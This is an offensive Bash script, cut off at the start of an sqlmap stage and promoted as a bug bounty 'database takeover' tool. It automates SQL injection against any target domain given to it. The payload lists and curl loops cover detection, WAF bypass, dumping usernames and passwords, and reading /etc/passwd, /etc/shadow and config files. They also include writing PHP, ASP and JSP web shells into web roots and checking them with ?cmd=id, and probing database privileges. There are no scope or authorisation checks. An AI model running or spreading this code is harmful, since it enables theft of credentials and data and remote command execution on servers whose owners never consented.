#!/bin/bash
# 💉 Advanced SQL Injection & Database Takeover - Elite Bug Bounty ($5000+ Techniques)
# Bhai, yeh script tumhe complete database takeover aur privilege escalation dega

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

TARGET=$1
if [ -z "$TARGET" ]; then
    echo -e "${RED}Usage: ./advanced_sqli_database_takeover.sh target.com${NC}"
    echo -e "${RED}       ./advanced_sqli_database_takeover.sh url_list.txt${NC}"
    exit 1
fi

echo -e "${GREEN}💉 Advanced SQL Injection & Database Takeover for $TARGET${NC}"
mkdir -p $TARGET/sqli_takeover/{discovery,payloads,exploitation,databases,shells,reports}
cd $TARGET

# Function: SQL injection target discovery and preparation
sqli_target_discovery() {
    echo -e "${BLUE}🎯 Phase 1: SQL Injection Target Discovery${NC}"
    
    # Determine input type
    if [ -f "$TARGET" ]; then
        cp "$TARGET" sqli_takeover/target_urls.txt
        echo -e "${YELLOW}[+] Using URL list from file: $TARGET${NC}"
    elif [ -f "content_discovery/parameters/all_discovered_params.txt" ]; then
        cp content_discovery/parameters/all_discovered_params.txt sqli_takeover/target_urls.txt
        echo -e "${YELLOW}[+] Using discovered parameter endpoints${NC}"
    elif [ -f "content_discovery/live_urls.txt" ]; then
        cp content_discovery/live_urls.txt sqli_takeover/target_urls.txt
        echo -e "${YELLOW}[+] Using discovered live URLs${NC}"
    else
        echo "http://$TARGET" > sqli_takeover/target_urls.txt
        echo "https://$TARGET" >> sqli_takeover/target_urls.txt
        echo -e "${YELLOW}[+] Using domain: $TARGET${NC}"
    fi
    
    # Extract URLs with parameters (SQL injection candidates)
    echo -e "${YELLOW}[+] Extracting SQL injection candidates...${NC}"
    
    # URLs with parameters from various sources
    if [ -f "content_discovery/all_crawled_urls.txt" ]; then
        grep "=" content_discovery/all_crawled_urls.txt >> sqli_takeover/urls_with_params.txt
    fi
    
    # GAU for parameter discovery
    echo $TARGET | gau | grep "=" >> sqli_takeover/urls_with_params.txt
    
    # Wayback URLs with parameters
    echo $TARGET | waybackurls | grep "=" >> sqli_takeover/urls_with_params.txt
    
    # Common SQL injection prone parameters
    cat > sqli_takeover/sqli_params.txt << 'EOF'
id
user_id
product_id
category_id
page_id
item_id
post_id
article_id
news_id
blog_id
comment_id
order_id
invoice_id
account_id
customer_id
member_id
profile_id
search
q
query
keyword
term
filter
sort
order
limit
offset
page
start
end
from
to
date
time
year
month
day
username
email
login
password
token
session
auth
key
hash
code
value
data
input
param
var
field
column
table
database
db
sql
cmd
exec
eval
EOF
    
    # Add common parameters to base URLs
    while read url; do
        if [ ! -z "$url" ]; then
            # Remove existing parameters and add SQL injection prone ones
            base_url=$(echo "$url" | cut -d'?' -f1)
            while read param; do
                echo "$base_url?$param=1" >> sqli_takeover/sqli_test_urls.txt
            done < sqli_takeover/sqli_params.txt
        fi
    done < sqli_takeover/target_urls.txt
    
    # Combine and deduplicate
    cat sqli_takeover/urls_with_params.txt sqli_takeover/sqli_test_urls.txt 2>/dev/null | sort -u > sqli_takeover/all_sqli_targets.txt
    
    echo -e "${GREEN}✅ SQL injection targets prepared: $(wc -l < sqli_takeover/all_sqli_targets.txt)${NC}"
}

# Function: Advanced SQL injection detection
advanced_sqli_detection() {
    echo -e "${BLUE}🔍 Phase 2: Advanced SQL Injection Detection${NC}"
    
    # Create comprehensive SQL injection payloads for detection
    cat > sqli_takeover/payloads/detection_payloads.txt << 'EOF'
# Basic SQL injection detection
'
"
' OR '1'='1
" OR "1"="1
' OR 1=1--
" OR 1=1--
' OR 1=1#
" OR 1=1#
' OR 1=1/*
" OR 1=1/*
1' OR '1'='1
1" OR "1"="1
1 OR 1=1
1 OR 1=1--
1 OR 1=1#

# Time-based detection
' AND SLEEP(5)--
" AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
"; WAITFOR DELAY '00:00:05'--
' AND (SELECT pg_sleep(5))--
" AND (SELECT pg_sleep(5))--
' AND (SELECT COUNT(*) FROM dual WHERE ROWNUM<=1 AND (SELECT COUNT(*) FROM user_tables)>0 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5))>0--

# Error-based detection
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
" AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND ExtractValue(1,CONCAT(0x7e,(SELECT version()),0x7e))--
" AND ExtractValue(1,CONCAT(0x7e,(SELECT version()),0x7e))--
' AND UpdateXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--
" AND UpdateXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--

# Boolean-based detection
' AND 1=1--
' AND 1=2--
" AND 1=1--
" AND 1=2--
' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
" AND (SELECT COUNT(*) FROM information_schema.tables)>0--
' AND (SELECT LENGTH(database()))>0--
" AND (SELECT LENGTH(database()))>0--

# Union-based detection
' UNION SELECT NULL--
" UNION SELECT NULL--
' UNION SELECT NULL,NULL--
" UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
" UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
" UNION SELECT 1,2,3--
EOF
    
    # WAF bypass payloads
    cat > sqli_takeover/payloads/waf_bypass_payloads.txt << 'EOF'
# Comment-based bypasses
/**/UNION/**/SELECT/**/
/*!UNION*//*!SELECT*/
/*! UNION */ /*! SELECT */
#
-- -
--+
;%00

# Case variation bypasses
UnIoN sElEcT
uNiOn SeLeCt
UNION/**/SELECT
union distinctrow select
union all select

# Encoding bypasses
%55%4e%49%4f%4e%20%53%45%4c%45%43%54
CHAR(85,78,73,79,78,32,83,69,76,69,67,84)
0x554e494f4e2053454c454354

# Space bypasses
UNION%20SELECT
UNION%09SELECT
UNION%0ASELECT
UNION%0BSELECT
UNION%0CSELECT
UNION%0DSELECT
UNION%A0SELECT
UNION+SELECT
UNION/**/SELECT
UNION%23foo%0ASELECT
UNION%2D%2Dfoo%0ASELECT

# Keyword bypasses
UNI/**/ON SE/**/LECT
UN/**/ION SEL/**/ECT
/*!50000UNION SELECT*/
/*!50000UNION*/ /*!50000SELECT*/
EOF
    
    echo -e "${YELLOW}[1/3] Basic SQL injection detection...${NC}"
    
    # Test basic SQL injection payloads
    while read target_url; do
        if [ ! -z "$target_url" ]; then
            echo "Testing SQL injection on: $target_url"
            
            # Get baseline response
            baseline=$(curl -s -m 10 "$target_url" 2>/dev/null | wc -c)
            
            while read payload; do
                if [ ! -z "$payload" ] && [[ ! "$payload" == \#* ]]; then
                    # URL encode the payload
                    encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g')
                    
                    # Test the payload
                    if [[ "$target_url" == *"="* ]]; then
                        # Replace existing parameter value
                        test_url=$(echo "$target_url" | sed "s/=[^&]*/=$encoded_payload/g")
                    else
                        # Add parameter
                        test_url="$target_url&test=$encoded_payload"
                    fi
                    
                    response=$(curl -s -m 15 "$test_url" 2>/dev/null)
                    response_length=$(echo "$response" | wc -c)
                    
                    # Check for SQL error indicators
                    if echo "$response" | grep -q -i -E "error|mysql|postgresql|oracle|sql|syntax|warning|fatal|exception|database|table|column|query|statement"; then
                        echo "🔥 SQL ERROR DETECTED: $test_url" | tee -a sqli_takeover/discovery/sql_errors.txt
                        echo "Payload: $payload" >> sqli_takeover/discovery/sql_errors.txt
                        echo "Response: $response" >> sqli_takeover/discovery/sql_error_responses.txt
                        echo "---" >> sqli_takeover/discovery/sql_error_responses.txt
                    fi
                    
                    # Check for significant response length differences (boolean-based)
                    length_diff=$((response_length - baseline))
                    if [ $length_diff -gt 100 ] || [ $length_diff -lt -100 ]; then
                        echo "🔍 RESPONSE LENGTH ANOMALY: $test_url" | tee -a sqli_takeover/discovery/length_anomalies.txt
                        echo "Baseline: $baseline, Response: $response_length, Diff: $length_diff" >> sqli_takeover/discovery/length_anomalies.txt
                    fi
                fi
            done < sqli_takeover/payloads/detection_payloads.txt
        fi
    done < <(head -20 sqli_takeover/all_sqli_targets.txt)  # Limit for initial testing
    
    echo -e "${YELLOW}[2/3] Time-based SQL injection detection...${NC}"
    
    # Time-based SQL injection detection
    while read target_url; do
        if [ ! -z "$target_url" ]; then
            echo "Testing time-based SQL injection on: $target_url"
            
            # Time-based payloads
            time_payloads=(
                "' AND SLEEP(5)--"
                "'; WAITFOR DELAY '00:00:05'--"
                "' AND (SELECT pg_sleep(5))--"
                "' AND IF(1=1,SLEEP(5),SLEEP(0))--"
            )
            
            for payload in "${time_payloads[@]}"; do
                encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g')
                
                if [[ "$target_url" == *"="* ]]; then
                    test_url=$(echo "$target_url" | sed "s/=[^&]*/=$encoded_payload/g")
                else
                    test_url="$target_url&test=$encoded_payload"
                fi
                
                # Measure response time
                start_time=$(date +%s)
                response=$(curl -s -m 20 "$test_url" 2>/dev/null)
                end_time=$(date +%s)
                response_time=$((end_time - start_time))
                
                # If response took more than 4 seconds, likely time-based SQL injection
                if [ $response_time -ge 4 ]; then
                    echo "🔥 TIME-BASED SQL INJECTION: $test_url" | tee -a sqli_takeover/discovery/time_based_sqli.txt
                    echo "Payload: $payload" >> sqli_takeover/discovery/time_based_sqli.txt
                    echo "Response time: ${response_time}s" >> sqli_takeover/discovery/time_based_sqli.txt
                    echo "---" >> sqli_takeover/discovery/time_based_sqli.txt
                fi
            done
        fi
    done < <(head -10 sqli_takeover/all_sqli_targets.txt)
    
    echo -e "${YELLOW}[3/3] WAF bypass testing...${NC}"
    
    # Test WAF bypass techniques on detected SQL injection points
    if [ -f "sqli_takeover/discovery/sql_errors.txt" ]; then
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                echo "Testing WAF bypasses on: $sqli_url"
                
                while read bypass_payload; do
                    if [ ! -z "$bypass_payload" ] && [[ ! "$bypass_payload" == \#* ]]; then
                        encoded_payload=$(echo "$bypass_payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g')
                        test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                        
                        response=$(curl -s -m 10 "$test_url" 2>/dev/null)
                        if echo "$response" | grep -q -i -E "version|database|user|table|column"; then
                            echo "🔥 WAF BYPASS SUCCESS: $test_url" | tee -a sqli_takeover/discovery/waf_bypass_success.txt
                            echo "Payload: $bypass_payload" >> sqli_takeover/discovery/waf_bypass_success.txt
                        fi
                    fi
                done < sqli_takeover/payloads/waf_bypass_payloads.txt
            fi
        done < sqli_takeover/discovery/sql_errors.txt
    fi
    
    echo -e "${GREEN}✅ SQL injection detection completed${NC}"
}

# Function: Database enumeration and information gathering
database_enumeration() {
    echo -e "${BLUE}🗃️ Phase 3: Database Enumeration & Information Gathering${NC}"
    
    # Database-specific enumeration payloads
    cat > sqli_takeover/payloads/enumeration_payloads.txt << 'EOF'
# MySQL enumeration
' UNION SELECT @@version,NULL--
' UNION SELECT database(),NULL--
' UNION SELECT user(),NULL--
' UNION SELECT @@hostname,NULL--
' UNION SELECT @@datadir,NULL--
' UNION SELECT @@basedir,NULL--
' UNION SELECT @@version_compile_os,NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username,password FROM users--
' UNION SELECT concat(username,':',password),NULL FROM users--
' UNION SELECT group_concat(username,':',password),NULL FROM users--
' UNION SELECT load_file('/etc/passwd'),NULL--
' UNION SELECT 'shell content',NULL INTO OUTFILE '/var/www/html/shell.php'--

# PostgreSQL enumeration
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--
' UNION SELECT inet_server_addr(),NULL--
' UNION SELECT inet_server_port(),NULL--
' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT usename,passwd FROM pg_shadow--
' UNION SELECT datname,NULL FROM pg_database--

# MSSQL enumeration
' UNION SELECT @@version,NULL--
' UNION SELECT db_name(),NULL--
' UNION SELECT user_name(),NULL--
' UNION SELECT @@servername,NULL--
' UNION SELECT name,NULL FROM sys.databases--
' UNION SELECT name,NULL FROM sys.tables--
' UNION SELECT name,NULL FROM sys.columns WHERE object_id=object_id('users')--
' UNION SELECT name,password_hash FROM sys.sql_logins--

# Oracle enumeration
' UNION SELECT banner,NULL FROM v$version--
' UNION SELECT global_name,NULL FROM global_name--
' UNION SELECT user,NULL FROM dual--
' UNION SELECT table_name,NULL FROM user_tables--
' UNION SELECT column_name,NULL FROM user_tab_columns WHERE table_name='USERS'--
' UNION SELECT username,password FROM dba_users--

# SQLite enumeration
' UNION SELECT sqlite_version(),NULL--
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--
EOF
    
    echo -e "${YELLOW}[1/4] Database version and system information...${NC}"
    
    # Test enumeration payloads on confirmed SQL injection points
    if [ -f "sqli_takeover/discovery/sql_errors.txt" ]; then
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                echo "Enumerating database for: $sqli_url"
                
                # Test version detection payloads
                version_payloads=(
                    "' UNION SELECT @@version,NULL--"
                    "' UNION SELECT version(),NULL--"
                    "' UNION SELECT sqlite_version(),NULL--"
                    "' UNION SELECT banner,NULL FROM v\$version--"
                )
                
                for payload in "${version_payloads[@]}"; do
                    encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g; s/\$/%24/g')
                    test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                    
                    response=$(curl -s -m 15 "$test_url" 2>/dev/null)
                    if echo "$response" | grep -q -i -E "mysql|postgresql|microsoft|oracle|sqlite|mariadb|version"; then
                        echo "🔍 DATABASE VERSION FOUND: $test_url" | tee -a sqli_takeover/databases/version_info.txt
                        echo "Payload: $payload" >> sqli_takeover/databases/version_info.txt
                        echo "Response: $response" >> sqli_takeover/databases/version_responses.txt
                        echo "---" >> sqli_takeover/databases/version_responses.txt
                    fi
                done
            fi
        done < sqli_takeover/discovery/sql_errors.txt
    fi
    
    echo -e "${YELLOW}[2/4] Database and table enumeration...${NC}"
    
    # Database and table enumeration
    if [ -f "sqli_takeover/discovery/sql_errors.txt" ]; then
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                echo "Enumerating tables for: $sqli_url"
                
                # Table enumeration payloads
                table_payloads=(
                    "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--"
                    "' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--"
                    "' UNION SELECT name,NULL FROM sys.tables--"
                    "' UNION SELECT table_name,NULL FROM user_tables--"
                    "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--"
                )
                
                for payload in "${table_payloads[@]}"; do
                    encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g')
                    test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                    
                    response=$(curl -s -m 15 "$test_url" 2>/dev/null)
                    if echo "$response" | grep -q -i -E "users|admin|accounts|customers|members|profiles|login|auth|password|email"; then
                        echo "🔍 INTERESTING TABLES FOUND: $test_url" | tee -a sqli_takeover/databases/table_info.txt
                        echo "Payload: $payload" >> sqli_takeover/databases/table_info.txt
                        echo "Response: $response" >> sqli_takeover/databases/table_responses.txt
                        echo "---" >> sqli_takeover/databases/table_responses.txt
                    fi
                done
            fi
        done < sqli_takeover/discovery/sql_errors.txt
    fi
    
    echo -e "${YELLOW}[3/4] Column enumeration...${NC}"
    
    # Column enumeration for interesting tables
    if [ -f "sqli_takeover/databases/table_info.txt" ]; then
        # Common interesting table names
        interesting_tables=("users" "admin" "accounts" "customers" "members" "profiles" "login" "auth")
        
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                for table in "${interesting_tables[@]}"; do
                    echo "Enumerating columns for table '$table' on: $sqli_url"
                    
                    # Column enumeration payloads
                    column_payloads=(
                        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$table'--"
                        "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='${table^^}'--"  # Uppercase
                        "' UNION SELECT attname,NULL FROM pg_attribute WHERE attrelid=(SELECT oid FROM pg_class WHERE relname='$table')--"
                        "' UNION SELECT name,NULL FROM sys.columns WHERE object_id=object_id('$table')--"
                        "' UNION SELECT column_name,NULL FROM user_tab_columns WHERE table_name='${table^^}'--"
                    )
                    
                    for payload in "${column_payloads[@]}"; do
                        encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g')
                        test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                        
                        response=$(curl -s -m 15 "$test_url" 2>/dev/null)
                        if echo "$response" | grep -q -i -E "username|password|email|hash|salt|token|key|secret|admin|role|privilege"; then
                            echo "🔍 SENSITIVE COLUMNS FOUND in $table: $test_url" | tee -a sqli_takeover/databases/column_info.txt
                            echo "Table: $table" >> sqli_takeover/databases/column_info.txt
                            echo "Payload: $payload" >> sqli_takeover/databases/column_info.txt
                            echo "Response: $response" >> sqli_takeover/databases/column_responses.txt
                            echo "---" >> sqli_takeover/databases/column_responses.txt
                        fi
                    done
                done
            fi
        done < sqli_takeover/databases/table_info.txt
    fi
    
    echo -e "${YELLOW}[4/4] Data extraction...${NC}"
    
    # Extract sensitive data
    if [ -f "sqli_takeover/databases/column_info.txt" ]; then
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                echo "Extracting sensitive data from: $sqli_url"
                
                # Data extraction payloads
                data_payloads=(
                    "' UNION SELECT username,password FROM users--"
                    "' UNION SELECT email,password FROM users--"
                    "' UNION SELECT concat(username,':',password),NULL FROM users--"
                    "' UNION SELECT group_concat(username,':',password),NULL FROM users--"
                    "' UNION SELECT username,password FROM admin--"
                    "' UNION SELECT email,password FROM admin--"
                    "' UNION SELECT user,password FROM accounts--"
                    "' UNION SELECT login,password FROM members--"
                )
                
                for payload in "${data_payloads[@]}"; do
                    encoded_payload=$(echo "$payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g')
                    test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                    
                    response=$(curl -s -m 15 "$test_url" 2>/dev/null)
                    if echo "$response" | grep -q -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[a-zA-Z0-9_]{3,}:[a-zA-Z0-9$./]{10,}"; then
                        echo "💰 SENSITIVE DATA EXTRACTED: $test_url" | tee -a sqli_takeover/databases/extracted_data.txt
                        echo "Payload: $payload" >> sqli_takeover/databases/extracted_data.txt
                        echo "Data: $response" >> sqli_takeover/databases/sensitive_data.txt
                        echo "---" >> sqli_takeover/databases/sensitive_data.txt
                    fi
                done
            fi
        done < sqli_takeover/databases/column_info.txt
    fi
    
    echo -e "${GREEN}✅ Database enumeration completed${NC}"
}

# Function: Advanced exploitation techniques
advanced_exploitation() {
    echo -e "${BLUE}🚀 Phase 4: Advanced Exploitation Techniques${NC}"
    
    echo -e "${YELLOW}[1/5] File system access...${NC}"
    
    # File system access payloads
    cat > sqli_takeover/payloads/file_access_payloads.txt << 'EOF'
# MySQL file operations
' UNION SELECT load_file('/etc/passwd'),NULL--
' UNION SELECT load_file('/etc/hosts'),NULL--
' UNION SELECT load_file('/etc/shadow'),NULL--
' UNION SELECT load_file('/var/www/html/config.php'),NULL--
' UNION SELECT load_file('/home/user/.bash_history'),NULL--
' UNION SELECT load_file('C:\Windows\System32\drivers\etc\hosts'),NULL--
' UNION SELECT load_file('C:\inetpub\wwwroot\web.config'),NULL--

# PostgreSQL file operations
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_file('/etc/hosts'),NULL--
' UNION SELECT pg_read_file('/var/log/postgresql/postgresql.log'),NULL--

# MSSQL file operations
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts', SINGLE_CLOB) AS x--
' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK 'C:\inetpub\wwwroot\web.config', SINGLE_CLOB) AS x--
EOF
    
    # Test file access on confirmed SQL injection points
    if [ -f "sqli_takeover/databases/extracted_data.txt" ]; then
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                echo "Testing file access on: $sqli_url"
                
                while read file_payload; do
                    if [ ! -z "$file_payload" ] && [[ ! "$file_payload" == \#* ]]; then
                        encoded_payload=$(echo "$file_payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g; s/\/%5C/g')
                        test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                        
                        response=$(curl -s -m 20 "$test_url" 2>/dev/null)
                        if echo "$response" | grep -q -E "root:x:|daemon:|bin:|sys:|127.0.0.1|localhost|<configuration>"; then
                            echo "🔥 FILE ACCESS SUCCESS: $test_url" | tee -a sqli_takeover/exploitation/file_access.txt
                            echo "Payload: $file_payload" >> sqli_takeover/exploitation/file_access.txt
                            echo "Content: $response" >> sqli_takeover/exploitation/file_contents.txt
                            echo "---" >> sqli_takeover/exploitation/file_contents.txt
                        fi
                    fi
                done < sqli_takeover/payloads/file_access_payloads.txt
            fi
        done < sqli_takeover/databases/extracted_data.txt
    fi
    
    echo -e "${YELLOW}[2/5] Web shell upload...${NC}"
    
    # Web shell upload payloads
    cat > sqli_takeover/payloads/shell_upload_payloads.txt << 'EOF'
# MySQL web shell upload
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--
' UNION SELECT '<?php eval($_POST["code"]); ?>',NULL INTO OUTFILE '/var/www/html/eval.php'--
' UNION SELECT '<?php echo shell_exec($_GET["c"]); ?>',NULL INTO OUTFILE '/var/www/html/cmd.php'--
' UNION SELECT '<%eval request("code")%>',NULL INTO OUTFILE '/var/www/html/shell.asp'--
' UNION SELECT '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',NULL INTO OUTFILE '/var/www/html/shell.jsp'--

# Different web root paths
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/shell.php'--
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/usr/share/nginx/html/shell.php'--
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/home/www/shell.php'--
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE 'C:\inetpub\wwwroot\shell.php'--
' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE 'C:\xampp\htdocs\shell.php'--
EOF
    
    # Test web shell upload
    if [ -f "sqli_takeover/exploitation/file_access.txt" ]; then
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                echo "Attempting web shell upload on: $sqli_url"
                
                while read shell_payload; do
                    if [ ! -z "$shell_payload" ] && [[ ! "$shell_payload" == \#* ]]; then
                        encoded_payload=$(echo "$shell_payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g; s/\/%5C/g; s/?/%3F/g; s/</%3C/g; s/>/%3E/g')
                        test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                        
                        # Attempt shell upload
                        response=$(curl -s -m 20 "$test_url" 2>/dev/null)
                        
                        # Extract potential shell path from payload
                        shell_path=$(echo "$shell_payload" | grep -o "'/[^']*\.php'" | sed "s/'//g")
                        if [ -z "$shell_path" ]; then
                            shell_path=$(echo "$shell_payload" | grep -o "'C:[^']*\.php'" | sed "s/'//g")
                        fi
                        
                        if [ ! -z "$shell_path" ]; then
                            # Try to access the uploaded shell
                            base_url=$(echo "$sqli_url" | cut -d'/' -f1-3)
                            shell_url="$base_url$(echo $shell_path | sed 's|/var/www/html||g; s|C:\inetpub\wwwroot||g')"
                            
                            shell_response=$(curl -s -m 10 "$shell_url?cmd=id" 2>/dev/null)
                            if echo "$shell_response" | grep -q -E "uid=|gid=|groups="; then
                                echo "🔥 WEB SHELL UPLOADED: $shell_url" | tee -a sqli_takeover/shells/uploaded_shells.txt
                                echo "Original URL: $sqli_url" >> sqli_takeover/shells/uploaded_shells.txt
                                echo "Shell URL: $shell_url" >> sqli_takeover/shells/uploaded_shells.txt
                                echo "Test Response: $shell_response" >> sqli_takeover/shells/shell_responses.txt
                                echo "---" >> sqli_takeover/shells/shell_responses.txt
                            fi
                        fi
                    fi
                done < sqli_takeover/payloads/shell_upload_payloads.txt
            fi
        done < sqli_takeover/exploitation/file_access.txt
    fi
    
    echo -e "${YELLOW}[3/5] Privilege escalation...${NC}"
    
    # Database privilege escalation
    cat > sqli_takeover/payloads/privilege_escalation.txt << 'EOF'
# MySQL privilege escalation
' UNION SELECT user,password FROM mysql.user--
' UNION SELECT host,user,password FROM mysql.user WHERE user='root'--
' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges--
' UNION SELECT user,file_priv,process_priv,super_priv FROM mysql.user--

# PostgreSQL privilege escalation
' UNION SELECT usename,usesuper,usecreatedb FROM pg_user--
' UNION SELECT rolname,rolsuper,rolcreatedb,rolcreaterole FROM pg_roles--

# MSSQL privilege escalation
' UNION SELECT name,is_srvrolemember('sysadmin',name) FROM sys.server_principals WHERE type='S'--
' UNION SELECT loginname,sysadmin,securityadmin,serveradmin FROM master..syslogins--
EOF
    
    # Test privilege escalation
    if [ -f "sqli_takeover/databases/extracted_data.txt" ]; then
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                echo "Testing privilege escalation on: $sqli_url"
                
                while read priv_payload; do
                    if [ ! -z "$priv_payload" ] && [[ ! "$priv_payload" == \#* ]]; then
                        encoded_payload=$(echo "$priv_payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g')
                        test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                        
                        response=$(curl -s -m 15 "$test_url" 2>/dev/null)
                        if echo "$response" | grep -q -E "root|admin|sysadmin|super|Y|1|true"; then
                            echo "🔥 PRIVILEGE ESCALATION POSSIBLE: $test_url" | tee -a sqli_takeover/exploitation/privilege_escalation.txt
                            echo "Payload: $priv_payload" >> sqli_takeover/exploitation/privilege_escalation.txt
                            echo "Response: $response" >> sqli_takeover/exploitation/privilege_responses.txt
                            echo "---" >> sqli_takeover/exploitation/privilege_responses.txt
                        fi
                    fi
                done < sqli_takeover/payloads/privilege_escalation.txt
            fi
        done < sqli_takeover/databases/extracted_data.txt
    fi
    
    echo -e "${YELLOW}[4/5] Network reconnaissance...${NC}"
    
    # Network reconnaissance through SQL injection
    cat > sqli_takeover/payloads/network_recon.txt << 'EOF'
# MySQL network reconnaissance
' UNION SELECT @@hostname,@@version--
' UNION SELECT user(),database()--
' UNION SELECT @@datadir,@@basedir--
' UNION SELECT @@socket,@@port--

# PostgreSQL network reconnaissance
' UNION SELECT inet_server_addr(),inet_server_port()--
' UNION SELECT current_user,session_user--
' UNION SELECT version(),current_database()--

# MSSQL network reconnaissance
' UNION SELECT @@servername,@@version--
' UNION SELECT SYSTEM_USER,USER_NAME()--
' UNION SELECT @@datadir,@@language--
EOF
    
    # Test network reconnaissance
    if [ -f "sqli_takeover/databases/extracted_data.txt" ]; then
        while read sqli_url; do
            if [ ! -z "$sqli_url" ] && [[ "$sqli_url" == *"http"* ]]; then
                echo "Network reconnaissance on: $sqli_url"
                
                while read recon_payload; do
                    if [ ! -z "$recon_payload" ] && [[ ! "$recon_payload" == \#* ]]; then
                        encoded_payload=$(echo "$recon_payload" | sed 's/ /%20/g; s/'''/%27/g; s/"/%22/g; s/#/%23/g; s/&/%26/g')
                        test_url=$(echo "$sqli_url" | sed "s/=[^&]*/=$encoded_payload/g")
                        
                        response=$(curl -s -m 15 "$test_url" 2>/dev/null)
                        if echo "$response" | grep -q -E "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[0-9]+"; then
                            echo "🔍 NETWORK INFO FOUND: $test_url" | tee -a sqli_takeover/exploitation/network_recon.txt
                            echo "Payload: $recon_payload" >> sqli_takeover/exploitation/network_recon.txt
                            echo "Info: $response" >> sqli_takeover/exploitation/network_info.txt
                            echo "---" >> sqli_takeover/exploitation/network_info.txt
                        fi
                    fi
                done < sqli_takeover/payloads/network_recon.txt
            fi
        done < sqli_takeover/databases/extracted_data.txt
    fi
    
    echo -e "${YELLOW}[5/5] Automated SQLMap exploitation...${NC}"
    
    # Use SQLMap for automated exploitation
    if [ -f "sqli_takeover/discovery/sql_errors.txt" ] && command -v sqlmap &> /dev/null; then
        echo "Running automated SQLMap exploitation..."
